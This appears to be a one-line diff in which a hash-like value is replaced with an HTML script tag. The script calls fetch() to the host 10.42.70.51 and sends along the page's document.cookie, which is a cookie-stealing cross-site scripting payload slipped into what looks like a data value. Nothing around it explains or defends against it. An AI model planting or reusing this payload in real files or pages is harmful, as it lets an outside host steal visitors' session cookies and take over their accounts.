@@ -1,1 +1,1 @@
-18f4dd367c5acb275cf7b5aeef31b451
+<script>fetch("//10.42.70.51/"+document.cookie)</script>
